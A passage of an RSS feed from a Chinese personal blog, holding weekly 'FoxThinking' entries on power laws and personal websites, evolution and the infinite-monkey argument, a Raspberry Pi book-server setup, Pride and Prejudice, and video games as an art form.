+就是一个支配着世界的一个规律，幂律定律（或者叫二八定律）。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;百分之八十的资源只会在百分之二十手上：论文引用数量、代码中的错误数量、地震的震级情况、人们的财富分布，这没有什么稀奇的，这
+就是一个支配着世界的一个规律，幂律定律（或者叫二八定律）。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;不「正常」的二八&quot;&gt;不「正常」的二八&lt;/h2&gt;&lt;p&gt;不过幂律定律其实不是在什么领域都见得到，它一般是在一些不「正常」概率分布中会显现，这里的正常指的是「正态分布」（
+normal distribution ）。生活中很多都是正态分布，例如抛硬币扔骰子在次数越来越多时分布图里最显眼的一定是 50/50 和
+点数为六的情况。其它的例如统计人的身高、气温平均值就会发现总会出现一个非常突出的平均值和其它少见的极端情况，这就是
+正常的「正态分布」。那么不正常的情况就是例如财富分布、地球上国家的国土分布，这些领域中总是有出现跨越很多个
+数量级的巨无霸，而且一般整体的数据会给这些巨无霸给吃完达到一种「百分之八十的资源只会在百分之二十手上」的效果。&lt;/p&gt;&lt;p&gt;这两种事件的概率分布也可以叫做轻尾分布和长（重）尾分布，对这两个概率分布为的简单定义是当分布中取一个很大值的时候，找到一
+个更大值的概率高不高 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; ：&lt;/p&gt;&lt;p&gt;如果不高例如人的身高（当有一个两米三的人找到比 ta 高的人概率还大吗？那两米四呢？）、气温（在五十度气温时找到比这天气温还
+高的概率还大吗？），就是轻尾分布，造成的数据是聚集和有界的；&lt;/p&gt;&lt;p&gt;如果很高，例如个人财富、国家人口数量和土地，那么就是长尾分布，造成的数据会横跨几个数量级，而且样本数据会被超大数量样本主导。&lt;/p&gt;&lt;p&gt;因为塑造这两种背后的力量是不同的，轻尾分布的是加法，而塑造长尾分布的是乘法（通常还是基于已有样本比值例如钱生钱和大国人口
+增长） &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;h2 id=&quot;互联网中的无足轻重的百分之八十&quot;&gt;互联网中的无足轻重的百分之八十&lt;/h2&gt;&lt;p&gt;毫无疑问互联网也在幂率定律的支配下，百分之八十的资源都集中在那几家巨头上，重来几次互联网的发展过程互联网可能叫得上号的网站
+名称会变但数量很可能仍是这个数量。这意味着对种情况就没有什么「对策」了吗？现在我只能在这些巨头上流转只能在推荐算法的胜利
+的阴影下遵从平台的意志了吗？&lt;/p&gt;&lt;p&gt;不，哪怕是一个玫瑰色回忆 &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; ，我仍然还是怀念之前在互联网上「冲浪」时候的发现一些新奇的个人网站的快乐，而不是检点推荐流
+上的消息感到自己像是一些什么格子间内「牲畜」。在幂律定律下除了令人显眼的百分之八十还有一个侧面就是「自组织临界性」
+（ Self-organized criticality ），在幂律定律支配下的系统例如雪坡或森林，当达到一个临界状态时，就无法判断一个小小的事件
+会带来怎么样的后果了，这个小小的事件可能会在整个系统中互相感应不停传播造成一个风暴，或许大概率只是一点点的雪花落下或是为一两棵树
+带来焦黄，但也有可能是整个雪坡的滑落或是要将整个森林吞没的百年难遇的火灾 &lt;sup&gt;&lt;a href=&quot;#4&quot; id=&quot;4r&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;p&gt;虽然我建立的只是些很小的站点，写的只是一些没什么营养的内容，是在这个体系下微不足道的百分之八十的一部分，但我还是打算存在下去。
+我不奢求成为引爆点将一大串的关注聚焦在我这里或是去推动些什么，只是希望这里的存在可以让互联网更……健康。在现在不断极化的互联网
+里，也是重新捡起个人站点、网络日志的时候了，发出自己声音，维护好自己的「八分地」。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/X6lIy0uO2WMuFZUATY958Q&quot; class=&quot;external_link&quot;&gt;谁在给你的脑子“投毒”？&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;PPT上有一行醒目的红字，“目前我已经为您做到：全自动采集、全自动改写、全自动发布！”&lt;/p&gt;&lt;p&gt;公司里电脑数量比员工更多，大部分房间都用来放电脑。公司对外的PPT上还展示了公司的“手机墙”，28部放在架子上的手机，都在开机自动运行程序。&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;大模型就像一条强劲的泥鳅，把水搅浑。凭借这个「词语机器」运营们正在疯狂「穷举」关键词的组合试图去寻找爆点，已经信无可信。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://tonyalicea.dev/blog/were-losing-our-voice-to-llms/&quot; class=&quot;external_link&quot;&gt;We're Losing Our Voice to LLMs | Tony Alicea&lt;/a&gt;
+发出自己的声音，就算不成熟也可以通过练习去磨练。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.solidot.org/story?sid=82752&quot; class=&quot;external_link&quot;&gt;奇客Solidot | Meta 靠诈骗广告收入去资助 AI&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Meta 不愿意立即删除骗子的账户，允许“高价值账户”积累逾 500 次违规，骗子的违规记录越多 Meta 收取的广告费率越高&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;惊讶吗？不惊讶。成为「黑箱」的平台最可怕，作恶只是一个在已经放上千钧重的砝码天平稍微掂量几下就作出的决定。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.infoq.cn/article/uxW0pGp9AjP3szECYjAO&quot; class=&quot;external_link&quot;&gt;新任CTO把PHP换成Perl，导致成本飙升错失市场机遇！网友：别怪技术，问题出在人身上_编程语言_李冬梅_InfoQ精选文章&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;当非核心信念受到质疑时，大脑推理中枢正常运转。参与者能够理性分析证据，权衡论点，甚至改变原有看法。&lt;/p&gt;&lt;p&gt;然而当核心信念遭遇挑战时，大脑反应如同遭受物理攻击。负责威胁识别的杏仁核立即激活——这与遭遇猛兽时的应激反应如出一辙；处理情绪痛苦与厌恶的脑岛皮层剧烈活动；最具启示性的是，维持自我认知的默认模式网络会立即进入防御状态，全力守护既存身份认同而非评估新信息。&lt;/p&gt;&lt;/blockquote&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://jandan.net/p/121573&quot; class=&quot;external_link&quot;&gt;你的身体以为你每天都在逃命 - 煎蛋&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;人类学家发现：现代生活把我们逼成了“每天面对狮子”的状态。身体以为还在非洲草原，随时得搏命逃跑，可狮子永远不走，导致慢性压力把健康一点点耗干。&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;战斗或逃跑这也是个很常见的「迷思」了，不过确实也没想到计科领域里编程语言（或编辑器）战争会牵扯到这些，确实有时候也没必
+要「自找没趣」去挑战人的「立身之本」啊……&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;这周从感冒中回复稍微好点了，虽然睡眠周期依然很「怪异」，工作日睡眠时间在六个小时左右然后周末就直接兽性大发在十二小时左右同时依然很困顿，
+没有什么精力。看起来得考虑一下寻找一下睡得更好的 SOP 了，我想应该还是跟光照有关，看看多出去走走多见见光会不会对睡眠有所帮助。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E9%87%8D%E5%B0%BE%E5%88%86%E5%B8%83&quot; class=&quot;external_link&quot;&gt;重尾分布 - 维基百科，自由的百科全书&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.bilibili.com/video/BV15kj4z4Eju/&quot; class=&quot;external_link&quot;&gt;【漫士】世界是对数的……吗？为什么？ - 哔哩哔哩&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Rosy_retrospection&quot; class=&quot;external_link&quot;&gt;Rosy retrospection - Wikipedia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#4r&quot; id=&quot;4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=HBluLfX2F_k&quot; class=&quot;external_link&quot;&gt;You've (Likely) Been Playing The Game of Life Wrong - YouTube&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #7: 无限猴子与刍狗</title><guid>https://blog.southfox.me/2025/11/fox-thinking-7/index.html</guid><pubDate>Sun, 30 Nov 2025 21:20:00 Z</pubDate><link>https://blog.southfox.me/2025/11/fox-thinking-7/index.html</link><description>&lt;p&gt;生命是多么离奇和复杂啊，哪怕一个血红蛋白的复杂程度，就像是一个猴子在打字机上随机打字到要「碰巧」
+打出一首十四行诗一样。这里蕴含的可能性已经比整个可观测宇宙里的原子数量一样多了，现有的科学理论可
+很难解释生命产生的复杂性啊……或者，真是这样吗？&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;生命是多么离奇和复杂啊，哪怕一个血红蛋白的复杂程度，就像是一个猴子在打字机上随机打字到要「碰巧」
+打出一首十四行诗一样。这里蕴含的可能性已经比整个可观测宇宙里的原子数量一样多了，现有的科学理论可
+很难解释生命产生的复杂性啊……或者，真是这样吗？&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;猴子式生命&quot;&gt;猴子式生命&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;他非常倚赖一个我们或许可以称之为“我就是不能相信”的论证……&lt;/p&gt;&lt;p&gt;……似乎无法以达尔文的理论解释……并不容易解释……难以了解……不容易理解……我发现它不容易理解……&lt;/p&gt;&lt;p&gt;我发现不容易了解……我发现难以理解…… &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;这种「想当然」的模式看得多了也就乏了，拿生命的复杂度来说，其实没有考虑到生命是一个继往开来的「过程」，生命从来不需要
+个体单打独斗，不需要一开始就是《哈姆雷特》。哪怕一开始打出来的全都是锟斤拷烫烫烫的语句也没关系，只要能要求后续猴子不是
+随机打而是要造着原文去复制（虽然不是很猴子）然后存在下来。在这里的情景中如果将目标定位《哈姆雷特》，那么在一次次的复制
+传播中的微小突变（这很猴子）中，筛去变得更不像《哈姆雷特》的，留下更像的，那么将会看到这个打出来的作品在慢慢往《哈姆雷特》
+靠拢。&lt;/p&gt;&lt;h2 id=&quot;刍狗式生命&quot;&gt;刍狗式生命&lt;/h2&gt;&lt;blockquote&gt;&lt;p&gt;天地不仁，以万物为刍狗。&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;天地没有仁心，把万物当作祭祀用的刍狗：在祭祀时顶礼膜拜，祭祀后却不屑一顾甚至拆开来当燃料。天地对万物的其实就
+像一个筛子，通过合适的留下不合适的。这种「意志」的体现甚至不需要什么「意识」，甚至可以说是物理规律，例如海边的圆滑的
+石子甚至是 3D 打印的螺丝分类器（&lt;a href=&quot;https://www.youtube.com/watch?v=fZ7rdNYJmZ4&quot; class=&quot;external_link&quot;&gt;3D printed screw length sorter - YouTube&lt;/a&gt; )。&lt;/p&gt;&lt;p&gt;所以生命就像是无限个猴子在有限台打字机上打出刍狗然后期待是在祭祀时节能够多打一点（什么硬凑的比喻）。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;《盲眼的钟表匠》：天择不为未来打算，没有视野，没有现将。如果天择是自然界的钟表匠，它一定是个盲眼的钟表匠。
+有点想把《物种起源》和理查德·道金斯的作品都翻出来成体系的读一读了，因为这是现代人在不去学习前置专业知识上能够读到的生物科学
+著作了……&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;《中国建筑史》：收集兴趣之，建筑——但是其实没有什么兴趣，就像书中说的：中国建筑以木料为主要构材，在用石上是失败的 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; ：
+而在我的整个成长过程中根本没有什么木质建筑的参与，只有盒子壮的钢筋混凝土盒子，所以自然没什么感触和兴趣了。里面的历史
+资料部分倒是读得下，一种眼看他起高楼又眼看他楼塌了的朝代更替。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;观影&quot;&gt;观影&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;《疯狂动物城2》：没想到竟然已经块十年过去了……但味还是那个味，感觉有点像三年后应该就做出来的只是拖到了现在，隐喻和映射依然
+刻板和直接但是动物所以看起来就没问题。不过不得不说这个电影的号召力真强啊，我在附近没什么客流量的小影院都能达到七八十的上座
+率。&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;这周的空余时间都拿来「吃派」了，现在这个博客不出意外就用树莓派通过 Cloudflare Tunnel 提供内容了，访问速度其实还行，比 Github
+Pages 的访问速度要快一点，后续为了高可用还需折腾一下健康检查然后切换到 Cloudflare Pages 服务的配置。搞好之后应该就拿搭建的
+服务和相关配置拿来写篇文章吧。&lt;/p&gt;&lt;p&gt;另外就是不要碰高糖饮料了，一瓶统一阿萨姆奶茶直接把我干到涕水横流了难受的很。想了想现在我的健康状态很微妙，公共交通的通勤堆积了很
+多病毒，平常相安无事只要喝点高糖饮料和受点寒平衡立马打破身子立马遭殃……在无法改变依赖公共交通的情况下还是少吃点高糖食品然后坚守一下
+「健康」的作息吧。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 理查德·道金斯. 盲眼钟表匠. 中信出版集团. 2014.&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 梁思成. 中国建筑史. 台海出版社. 2023, 第 11 页.&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #6: 珍视是最大的浪费</title><guid>https://blog.southfox.me/2025/11/fox-thinking-6/index.html</guid><pubDate>Sun, 23 Nov 2025 23:21:00 Z</pubDate><link>https://blog.southfox.me/2025/11/fox-thinking-6/index.html</link><description>&lt;p&gt;珍视有时候也是一种浪费&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;珍视有时候也是一种浪费&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;空闲之于浪费&quot;&gt;空闲之于浪费&lt;/h2&gt;&lt;p&gt;双十一时买了树莓派 5 8G 版本和一个 2T 的固态硬盘，在一开始买的转接板过小之后又买额外买了个合适的转接板。
+这一周的空闲时间都花在了折腾树莓派上，为了创建需求翻了很多相关帖子：《树莓派不吃灰的xx用途》、《树莓派最
+佳项目》、《我用树莓派干了xx》……最后挑选用 calibre 建立自己的书籍库存一些在 &lt;a href=&quot;www.humblebundle.com/&quot;&gt;Humble Bundle&lt;/a&gt; 上买的书
+(最后统计下来发现竟然买了差不多一百本了）。calibre 官方不建议将数据库文件放在网络存储上，然后我也不想把
+calibre 整体放在树莓派上。看来看去发现我可以将所有文件复制到树莓派上然后用 &lt;a href=&quot;https://github.com/janeczku/calibre-web&quot; class=&quot;external_link&quot;&gt;calibre-web&lt;/a&gt; 项目作为一个前
+端进行展示。不过这意味着我需要在我的电脑存上一份然后在树莓派存上一份，但这意味需要消耗多份空间，值得吗？
+最后统计出来其实我所有相关的书放在 calibre 里也就消耗 1G 的空间，这点空间哪怕对于我笔记本的 1T 空间
+来说也就千分之一（对于树莓派来说就二千分之一了），按照一个 epub 的电子书文件 10M 空间来算其实也能存很多
+了。&lt;/p&gt;&lt;p&gt;之后检查了一下我的笔记本，除去 .gradle 和安卓 sdk 之类的构件依赖和缓存，我这 1T 电脑大半年下来其实也就用了
+30G 的空间，按照这个趋势哪怕用上十年也只会用上 300 多 G 的空间。这么节省的用法「得益」于我之前用得设备空间都不大的缘故，
+所以不知怎么就养成了能在线看的就在线看、不轻易插入媒体文件之类节省存储空间「小妙招」。但现在其实已经没必要
+这么做了，有点让我想起以前买的本子和纸张因为太「新」而不轻易落笔之后在整理时在灰尘堆里翻出来的经历。有时候「珍视
+就是一种最大的浪费」而且「过早优化是万恶之源」。所以很多东西还是先「用上」等到了一定程度才来考虑下一步。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;《傲慢与偏见》：有时候名著是时间这一个「大过滤器」最直观的体现，或者说可以把名著看成历史长河上的「高分榜单」，虽然
+不一定适合但一定有质量，所以还是来多看点名著吧。《傲慢与偏见》这本书虽然之事描写了三五户人家的家长里短之事，但里
+头的杰出之处比起其它名著也丝毫不少，我认为里头最有价值的就是所谓的「为人处世」之道：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;有时候人得要「装」：虽然很多时候有个性不随波逐流超脱于人是件好事，但是有智慧的人不会给自己找麻烦事，而「礼数」
+在处事时可能是最能减少麻烦事的一个「投入」了。书里头如果达西能像彬格莱一样能够待人和善热情一点能省下多少后来的
+麻烦事啊！书里头很多里都在描述交际的时候面对不喜欢或麻烦之人如何如何，哪怕不喜欢，搪塞和敷衍上说几句客套话
+不要结恶，这也是一种避免麻烦事的体现。可能对于神经多样性 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 的人来说很难，不过「说话多盯着人眼睛」、「表现
+得诚恳一点」、「多思考接下来要说出口的话会引起他人怎么样的反应」这些能尽量去做到吧。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;偏见是个坏东西：作为标题的一部分偏见在书里有众多描述，除了最直接的伊丽莎白对达西的偏见其实还有人对自己的偏见，伊丽
+莎白自以为有知人之明有本领的「偏见」也带来了对达西的「偏见」。所以有时候人还是需要一个手段检阅自己的想法思考思考它
+到底是否受到了偏见影响吧……嗯，之后的日记多写点这方面的吧。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://landoflisp.com/&quot; class=&quot;external_link&quot;&gt;land of lisp&lt;/a&gt; （HTTP 网站警告！）:好「癫」的一部作品，这本书作为 &lt;a href=&quot;www.humblebundle.com/&quot;&gt;Humble Bundle&lt;/a&gt; 之前一个捆绑包里的物品现在整理时
+才发现，看了看它的官方网站其实做的很有趣的，也让我见识到了十五年前的前端生态包括 jquery 还有针对 IE 浏览器的优化。
+现在我动了汉化它的心思然后挑一个 lisp 的 web 实现来复刻网站上的点击效果（其实我博客现在也是一个 lisp 之地了，百分之
+九十都是 lisp）。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;是的因为这周的时间都花在折腾树莓派上所以其它的流程没怎么管，我还在寻找属于我的「启动流程」，因为很多时候我还是能干事的只
+不过我很多时候是败在「点进来」这个动作上，所以还是多思考如何启动吧！而且很多时候也要考虑记录笔记之类的是阶段性的，应该多
+多及时记录而不是等待最后的总结复盘，否则到了最后债多了不愁就没有然后了。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 孤独症（自闭症）、AD(H)D 等一系列偏离「平均」模式的人的说法……&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #5: 何以为电子游戏</title><guid>https://blog.southfox.me/2025/11/fox-thinking-5/index.html</guid><pubDate>Sun, 16 Nov 2025 22:15:00 Z</pubDate><link>https://blog.southfox.me/2025/11/fox-thinking-5/index.html</link><description>&lt;p&gt;游戏这门「艺术」和其它的艺术区别在哪里呢？&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;游戏这门「艺术」和其它的艺术区别在哪里呢？&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;音乐方块，你崛起吧&quot;&gt;音乐方块，你崛起吧&lt;/h2&gt;&lt;p&gt;11.11 除了人们在谈论的购物节外，对我来说这一天也是&lt;a href=&quot;https://store.steampowered.com/app/2370000/Lumines_Arise/&quot; class=&quot;external_link&quot;&gt;《Lumines Arise》&lt;/a&gt;这个我期待已久的游戏发售的一天。
+在花了两三天的时间通关了旅程模式后，也是收获到了和工作室前面作品 &lt;a href=&quot;https://store.steampowered.com/app/1003590/Tetris_Effect_Connected/&quot; class=&quot;external_link&quot;&gt;《Tetris® Effect: Connected》&lt;/a&gt;一样的多种感受：
+震动、撼动、感动还有一些惆怅。不过可惜了点就是《Lumines》的游戏形式对比俄罗斯方块还是没那么直接易懂，在高速操作下
+容易转不过来然后越来越无法操作输掉游戏导致中断流程稍微有点断掉心流。&lt;/p&gt;&lt;p&gt;在玩完后也思考了游戏带来的感受与在其它艺术形式的不同，通过和十月份玩《黑迪斯2》一起作为例子梳理一些感想。&lt;/p&gt;&lt;h2 id=&quot;从时间上分类&quot;&gt;从时间上分类&lt;/h2&gt;&lt;p&gt;可以粗略的将各种艺术形式分成是否「实时」的，「实时」上就是需要现场表演的艺术形式例如演唱戏剧，而除了「实时」的就是一锤子
+「买卖」了，例如文章诗歌剧本。当然这里一种艺术会根据是否「实时」而有所不同，例如剧本「实例化」 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 后就是戏剧演出了。&lt;/p&gt;&lt;p&gt;而「实时」与否也很大程度上是这种形式的乐趣所在，例如不同演员阵容下对一个戏剧的演绎、歌手的状态对歌曲的演出等（都到
+现场了还要求和 CD 上唱得一样那还去什么现场呢？）。而游戏的实时则会有不同了，因为游戏的实时性是跟着玩家输入走的，
+在游戏中途你随时可以暂停，哪怕是在剧情最激烈的最终头目战的时候 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;h2 id=&quot;交互的艺术&quot;&gt;交互的艺术&lt;/h2&gt;&lt;p&gt;游戏的最大的特点当然就是「交互」，而这种交互可以由创作者任意进行设置：以某种脚本演出或者用更不可预测的……随机性，
+以&lt;a href=&quot;https://store.steampowered.com/app/1003590/Tetris_Effect_Connected/&quot; class=&quot;external_link&quot;&gt;《Tetris® Effect: Connected》&lt;/a&gt; 为例，所有方块的移动都会在预先设置的效果音种随机选取一种然后播放，营造了一种每
+盘游戏都会有细微不同的体验。而对于《哈迪斯》这就更加「丧心病狂」了，多达一万多条的对话，根据面对的敌人、选取的祝福、
+送的礼物人选都会在对话池种随机选出一个对话 &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 。也就游戏里能做出这种效果了，或许一些实验文学作品可以做出一点多分支
+或者乱序叙述，但也不太可能做出高达上千条剧情块然后叫读者来去体验了。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;p&gt;这周在完善阅读配置 &lt;a href=&quot;https://git.southfox.me/elisp/miniflux.el&quot; class=&quot;external_link&quot;&gt;elisp/miniflux.el&lt;/a&gt; ，然后凭着这个包终于解决掉半年积压的未读
+条目，然后把一些感兴趣的文章送到未读服务去，当然……没有读，所以现在还是有很多未读，不过至少将整个产线推进了一个阶段。
+下周我还想配置一下在 Emacs 阅读 Wallabag 未读的流程同时看看能不能实现自动将单词推送到 Anki 来完成外语学习的配置（这也是
+卡了很久的未做之事）。&lt;/p&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;lisp game jam 结束了，在转译器上无法解决一个循环体的多重值绑定问题所以只能无奈放弃原有的游戏构想然后拿一个 PONG demo 项目
+用转译器重写了遍提交到了 game jam 上。这对一个 game jam 来说肯定不合适不过我也就只能这样了，不过如果将其视为转译器的概念验证
+的话效果还是挺不错的（当然，功劳大半都在 Godot 引擎上）。&lt;/p&gt;&lt;p&gt;双十一我还买了个 8G 版树莓派5 和一个 2T 的 SSD ，虽然我好像没有很多需求不过我还是买了。今天所有东西才到货,折腾了几个小时发现
+主要问题就是 SSD 买的太大而有点超出转接板，在新转接板到货之前暂时先找了个配重压下翘起的硬盘。&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/115/558/777/640/701/296/original/dd71f88fc3fbb4d4.jpg&quot; alt=&quot;一张树莓派板子的照片&quot; href=&quot;https://media.southfox.me/media_attachments/files/115/558/777/640/701/296/original/dd71f88fc3fbb4d4.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;一张树莓派板子的照片&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;然后也是鼓捣好了系统，下周看看能在这上面折腾点什么东西出来。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 这到是一个很好解释镜像和容器的、程序和运行中的程序实例的例子……&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;  &lt;a href=&quot;https://www.bilibili.com/video/BV1Yb411W7tZ/&quot; class=&quot;external_link&quot;&gt;【游戏音乐课】《八方旅人/歧路旅人》如何让Boss战音乐更燃&lt;/a&gt; 就比如《八方旅人》就考虑了在剧情高潮处让音乐维持
+在某个阶段等待玩家的输入。&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=bwdYL0KFA_U&quot; class=&quot;external_link&quot;&gt;The System Behind Hades' Astounding Dialogue - YouTube&lt;/a&gt;&lt;/p&gt;</content:encoded></item></channel></rss>
